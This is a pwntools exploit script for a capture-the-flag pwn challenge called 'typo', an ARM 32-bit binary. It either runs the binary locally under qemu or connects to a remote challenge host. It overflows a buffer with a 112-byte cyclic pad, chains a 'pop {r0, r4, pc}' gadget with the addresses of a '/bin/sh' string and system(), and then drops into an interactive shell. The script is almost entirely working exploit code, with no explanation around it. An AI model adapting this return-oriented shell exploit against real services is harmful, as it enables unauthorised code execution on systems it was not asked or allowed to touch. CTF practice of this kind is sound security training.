from pwn import *
import sys
remote_addr = ["node4.buuoj.cn",27348]
#libc = ELF('')
#elf = ELF('')
if len(sys.argv) == 1:
    # context.log_level="debug" 
    #io = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    # io = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    io = process(["qemu-arm-static", "-g", "1234", "./typo"]) 
    # io = process("")
    context(arch='arm', os='linux',bits='32')
    # context.terminal['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        io = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')

str_sh=0x6c384
sys_addr=0x110b4


payload=cyclic(0x200)
io.sendafter(b"t\n",b"\n")
# io.send(payload)

#offset 112 
#0x00020904: pop {r0, r4, pc}; 


payload=cyclic(112)+p32(0x20904)+p32(str_sh)*2+p32(sys_addr)
io.sendafter(b"\n",payload)

io.interactive()